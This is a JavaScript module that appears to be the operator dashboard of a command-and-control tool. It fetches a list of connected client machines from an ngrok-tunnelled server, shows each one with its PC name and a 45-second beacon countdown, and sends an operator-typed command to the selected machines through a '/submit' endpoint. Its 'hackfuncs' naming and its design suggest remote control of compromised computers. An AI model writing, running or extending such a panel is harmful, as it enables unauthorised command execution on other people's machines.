let localClientsList = [];
let startTimes = {};

export async function submitSelectedCommands() {
    const checkboxes = document.querySelectorAll(
        "#clientsContainer input[type='checkbox']:checked"
    );
    const command = document.getElementById("command").value;

    if (checkboxes.length === 0) {
        console.error("Error: No checkboxes selected.");
        return;
    }

    // Crear un nuevo objeto local para cada envío
    const commandClientMap = {};

    checkboxes.forEach((checkbox) => {
        const clientId = checkbox.id.replace("clientCheckbox_", "");
        commandClientMap[clientId] = { command: command };
    });
    console.log("Prepared data to send:", JSON.stringify(commandClientMap, null, 2));

    try {
        const response = await fetch(
            "https://flexible-elk-monthly.ngrok-free.app/submit",
            {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(commandClientMap),
            }
        );

        if (response.ok) {
            const data = await response.json();
            console.log("Commands sent:", data);
            console.log("Received data:", JSON.stringify(data, null, 2)); // Formatear JSON
        } else {
            console.error("Error sending commands:", response.status, response.statusText);
        }
    } catch (error) {
        console.error("Error sending commands:", error);
    }
}

function renderClients() {
    const clientsDiv = document.getElementById("clientsContainer");
    clientsDiv.innerHTML = ""; // Limpiar el contenido actual del div
  
    console.log("Render Clients: Clients", window.hackfuncs.localClientsList);
  
    window.hackfuncs.localClientsList.forEach(({ client_id, pc_name }) => {
      const clientTemplate = `
        <div id="checkboxContainer_${client_id}" class="pop-in">
          <label class="custom-checkbox">
            <input type="checkbox" id="clientCheckbox_${client_id}" />
            <span class="checkmark"></span>
            <span class="client-number">${client_id}</span>
          </label>
          <div class="client_info">
            <p class="pcname">${pc_name}</p>
            <p>AFA: <span id="counter_${client_id}" class="counter">00:00</span></p>
          </div>
        </div>`;
      clientsDiv.insertAdjacentHTML("beforeend", clientTemplate);
      console.log(`Added client ${client_id} to the DOM`);
    });

    updateCounters();
}

function updateCounters() {
    console.log("Counter Called");
  
    window.hackfuncs.localClientsList.forEach(({ client_id, start_time }) => {
        const counterElement = document.getElementById(`counter_${client_id}`);
        if (counterElement) {
            console.log(`Updating counter for client ${client_id}`);
            
            // Calcular el tiempo restante
            const interval = setInterval(() => {
                const now = new Date();
                const elapsedSeconds = Math.floor((now - start_time) / 1000);
                const remainingSeconds = 45 - (elapsedSeconds % 45);
    
                if (remainingSeconds <= 0) {
                    // Reiniciar el tiempo
                    const newStartTime = new Date(now.getTime() + 1000 * (45 - (elapsedSeconds % 45)));
                    // Actualiza el start_time en localClientsList
                    const clientIndex = window.hackfuncs.localClientsList.findIndex(client => client.client_id === client_id);
                    if (clientIndex !== -1) {
                        window.hackfuncs.localClientsList[clientIndex].start_time = newStartTime;
                    }
                }
    
                const minutes = String(Math.floor(remainingSeconds / 60)).padStart(2, "0");
                const seconds = String(remainingSeconds % 60).padStart(2, "0");
                counterElement.textContent = `${minutes}:${seconds}`;
            }, 1000);
        } else {
            console.log(`Counter element for client ${client_id} not found`);
        }
    });
}

async function loadClients() {
    return fetch("https://flexible-elk-monthly.ngrok-free.app/current_clients", {
      method: "GET",
      headers: {
        "Content-Type": "application/json",
        "ngrok-skip-browser-warning": "skip-browser-warning",
      },
    })
    .then((response) => response.json())
    .then((data) => {
      if (data.clients_list) {
        // Filtrar los IDs de cliente que aún no están en la lista local
        const newClients = data.clients_list.filter(
          ({ client_id }) => !window.hackfuncs.localClientsList.some((client) => client.client_id === client_id)
        );
        
        // Actualizar la lista local con los nuevos clientes
        window.hackfuncs.localClientsList = [
          ...window.hackfuncs.localClientsList,
          ...newClients.map(({ client_id, pc_name, start_time }) => {
            // Convertir start_time a objeto Date
            const startTime = new Date(start_time * 1000);
            
            // Verificar si la conversión fue exitosa
            if (isNaN(startTime.getTime())) {
              console.error(`Invalid start_time format for client ${client_id}: ${start_time}`);
              return null; // Retorna null si el cliente tiene un formato inválido
            }
  
            return { client_id, pc_name, start_time: startTime }; // Guardar cliente en el formato requerido
          }).filter(client => client !== null) // Filtrar los clientes inválidos
        ];
        
        console.log("DATA", window.hackfuncs.localClientsList);
        return window.hackfuncs.localClientsList;
      } else {
        console.error("Error: No clients list found in response.");
        // Devolver un array vacío o manejar el error según sea necesario
        return [];
      }
    })
    .catch((error) => {
      console.error("Error:", error);
      // Devolver un array vacío o manejar el error según sea necesario
      return [];
    });
  }



async function reloadClients() {
    let data = loadClients().then(() =>{
    renderClients(data);
    })

}

// Exportar funciones y variables al espacio de nombres `hackpy`
window.hackfuncs = {
    loadClients,
    renderClients,
    updateCounters,
    submitSelectedCommands,
    reloadClients,
    localClientsList,
    startTimes,
};
